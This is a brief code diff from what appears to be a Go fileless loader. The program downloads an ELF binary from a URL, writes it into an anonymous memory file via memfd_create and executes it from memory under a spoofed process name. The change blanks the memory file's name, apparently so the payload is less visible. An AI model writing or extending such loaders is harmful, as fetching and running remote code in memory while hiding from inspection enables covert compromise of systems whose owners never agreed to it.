@@ -83,7 +83,7 @@ func main() {
 	elfContent = RetrieveFile(url)
 
 	// Create fd and Inject Code
-	fd = MemfdCreate("psovaya")
+	fd = MemfdCreate("")
 	WriteToMemfd(fd, elfContent)
 	ExecMemfd(fd, procname)
 }
